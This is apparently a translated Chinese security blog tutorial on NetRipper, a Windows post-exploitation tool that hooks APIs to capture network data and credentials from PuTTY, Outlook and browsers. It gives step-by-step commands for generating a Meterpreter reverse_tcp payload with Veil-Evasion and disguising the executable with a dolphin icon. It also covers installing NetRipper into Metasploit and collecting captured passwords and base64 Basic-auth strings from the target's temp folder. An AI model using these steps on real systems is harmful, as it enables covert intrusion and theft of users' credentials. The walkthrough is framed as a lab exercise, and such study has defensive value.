今年,第23届Defcon大会在美国的拉斯维加斯盛大开幕,而NetRipper正是在本届Defcon大会上首次面世。NetRipper是一款针对Windows操作系统的漏洞利用工具,它可以使用API hooking从一个低权限的用户那里截获网络通信数据以及与加密相关的信息,而且还可以捕获明文通信数据以及经过加密的通信数据。

点击下列地址,可以在Github主页中查看关于该项目的详细信息:

https://github.com/NytroRST/NetRipper

NetRipper可以给用户提供一个独立的命令行注入方法,如果你可以成功入侵一台Windows操作系统的目标主机,那么它就可以帮助你在目标主机的系统中加载/执行任意命令。但是这篇文章将要介绍的是一种预编译的“恶意”可执行方法,这个功能是由Meterpreter的一个内置reverse\_tcp shell所提供的。我们还应该注意到,NetRipper还可以对火狐浏览器,Chrome浏览器,Lync(Skype的一项业务),puTTY,WinSCP,SQL服务器管理程序以及微软Outlook客户端进行数据注入以及捕获相关的网络数据。所以,这篇文章所要讲述的就是有关puTTY以及Outlook的部分,而且相关操作并不需要得到管理员权限或者系统权限。

**漏洞利用(实验条件下)可以通过以下步骤完成:**

1.使用Veil-Evasion来创建一个“恶意”的reverse\_tcp shell可执行脚本。执行这个文件的用户将会看到屏幕上出现一个可爱的海豚。

![](../Images/6deff3a5074d4313bbfe7b4929331c9a.png "t015344d1c013fe5fee.jpg")

2.利用一个先前已经存在于系统中的漏洞,然后得到一个reverse shell。

我们的讨论重点将会放在reverse\_tcp shell可执行方法上。

使用Veil-Evasion创建一个.exe文件:

use python/meterpreter/rev\_tcp

![](../Images/b03c17086a071c04321e5d6d4f676155.png "t01a296cf799225a747.jpg")

set LHOST 

set LPORT 4444 

set USE\_PHYERION Y 

generate

![](../Images/44ae569e52c0a31237eb6b879dd0ad22.png "t014aa03bddfbc18b6d.jpg")

为输出文件设置一个初始文件名,然后选择需要使用的有效载荷构造方法。

![](../Images/c6917e0ac53615aa9f873776cb5a3c87.png "t0174e4b517d058f4b6.jpg")

![](../Images/65facc46e7e8e318d591a8e694ef0b65.png "t016cc871aeeed901d1.jpg")

然后用一只海豚的图片将exe可执行文件的图标替换掉,因为海豚非常的特别。在这一步的操作中,你可以使用Resource Hacker来实现。

![](../Images/d829a1632c83cb70ccffc4bbda0e1ca9.png "t01c38a2f8e8587c7b9.jpg")

**在使用Metasploit之前,需要下载NetRipper并对其进行配置:**

(NetRipper安装文档:Readme):

git clone https://github.com/NytroRST/NetRipper.git cd NetRipper cd Metasploit cp netripper.rb /usr/share/metasploit-framework/modules/post/windows/gather/ mkdir /usr/share/metasploit-framework/modules/post/windows/gather/netripper g++ -Wall netripper.cpp -o netripper cp netripper /usr/share/metasploit-framework/modules/post/windows/gather/netripper/ cd ../Release cp DLL.dll /usr/share/metasploit framework/modules/post/windows/gather/netripper/DLL.dll

**配置Metasploit**

设置你需要用到的reverse处理器,并启动它:

![](../Images/98879d4a85733484cacb1ef5876e2483.png "t01a0b831af70294f2f.jpg")

在目标主机上执行这个有效载荷:

![](../Images/7b6d52ee050780e6b160926c0ed622c3.png "t013c988b3a18520bcd.jpg")

开启Meterpreter会话:

![](../Images/317138a3baf2ab1788a119a8bd8d4c74.png "t011ae1fa9826f350a2.jpg")

在后台发送Meterpreter数据,这样一来我们才可以加载我们的netripper模块:

meterpreter >background

加载netripper模块,并对其进行配置,然后运行它:

![](../Images/0bfc36c22b1735eb06e75e17dc5e6d4c.png "t01fb72858a8646eb9c.jpg")

此时此刻,注入的进程会将捕获到的数据保存在temp文件夹(临时文件夹)中,这个temp文件夹的路径可以在目标主机的TEMP环境变量中进行设置和修改,实验条件下的temp文件夹路径为:

\[C:\\Users\\<user>\\AppData\\Local\\Temp\\NetRipper\]

当用户开启了一个puTTY会话进程后,密码和命令都将会保存在下面的位置:

![](../Images/5231906c0a3460f8500e4ba8d57b6801.png "t0104ccaef3d2657657.jpg")

![](../Images/1774db8ef8ce415ccbc621eb6608e0c1.png "t018d2dd797dcb7b7a8.jpg")

根据程序捕获到的微软Outlook客户端的数据,你将可以从中找到一个用于基础验证的base64加密字符串:

![](../Images/ad9cdb3185b3113a9ca1e88191d30fc9.png "t01426146ea5b660ba6.jpg")
